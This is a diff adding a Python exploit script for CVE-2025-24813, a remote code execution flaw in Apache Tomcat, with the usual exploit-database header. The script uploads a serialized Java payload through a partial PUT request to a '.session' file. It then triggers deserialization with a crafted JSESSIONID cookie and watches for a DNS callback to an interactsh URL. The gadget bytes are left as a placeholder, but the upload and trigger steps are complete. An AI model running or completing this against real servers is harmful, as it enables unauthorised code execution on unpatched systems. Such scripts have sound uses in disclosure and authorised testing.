@@ -1,0 +1,63 @@
+# Exploit Title: Apache Tomcat Path Equivalence - Remote Code Execution
+# Exploit Author: Al Baradi Joy
+# CVE: CVE-2025-24813
+# Date: 2025-04-06
+# Vendor Homepage: https://tomcat.apache.org/
+# Software Link: https://tomcat.apache.org/download-90.cgi
+# Version: Apache Tomcat < 11.0.3 / 10.1.35 / 9.0.98
+# Tested on: Apache Tomcat 10.1.33
+# CVSS: 9.8 (CRITICAL)
+# CWE: CWE-44, CWE-502
+# Reference:
+https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html
+
+import requests
+import random
+import string
+import sys
+
+def rand_filename(length=6):
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+def generate_payload(interact_url):
+    # Java serialized payload gadget triggering DNS interaction
+    return f'\xac\xed\x00\x05...'  # Replace with actual gadget bytes or
+generator
+
+def exploit(target, interact_url):
+    filename = rand_filename()
+    put_url = f"{target}/{filename}.session"
+    get_url = f"{target}/{filename}"
+    headers = {
+        "Content-Range": "bytes 0-452/457",
+        "Content-Type": "application/octet-stream"
+    }
+    payload = generate_payload(interact_url)
+
+    print("[+] Exploit for CVE-2025-24813")
+    print("[+] Made By Al Baradi Joy\n")
+    print(f"[+] Uploading payload to: {put_url}")
+    r1 = requests.put(put_url, data=payload, headers=headers)
+    if r1.status_code == 201:
+        print("[+] Payload uploaded successfully.")
+    else:
+        print(f"[-] Upload failed with status: {r1.status_code}")
+        return
+
+    print(f"[+] Triggering payload via: {get_url}")
+    cookies = {"JSESSIONID": f".{filename}"}
+    r2 = requests.get(get_url, cookies=cookies)
+    print(f"[+] Trigger request sent. Check for DNS callback to:
+{interact_url}")
+
+if __name__ == "__main__":
+    # Display banner first
+    print("[+] Exploit for CVE-2025-24813")
+    print("[+] Made By Al Baradi Joy\n")
+
+    # Ask the user for the target domain and interact URL
+    target_url = input("Enter the target domain (e.g., http://localhost:8080):
+")
+    interact_url = input("Enter your interactsh URL: ")
+
+    exploit(target_url, interact_url)
